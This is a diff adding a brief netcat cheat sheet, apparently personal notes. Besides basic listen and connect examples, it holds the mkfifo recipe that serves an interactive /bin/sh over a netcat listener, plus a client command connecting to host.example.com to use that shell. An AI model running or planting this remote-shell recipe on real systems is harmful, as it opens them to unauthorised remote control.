@@ -1,0 +1,19 @@
+nc - netcat
+------------
+
+server:
+    $ nc -l 1234
+
+client:
+    $ nc 127.0.0.1 1234
+
+
+server:
+    rm -f /tmp/f; mkfifo /tmp/f
+    cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
+
+client:
+    nc host.example.com 1234
+
+
+nc -l -s <ip> -p <source_port> -u 
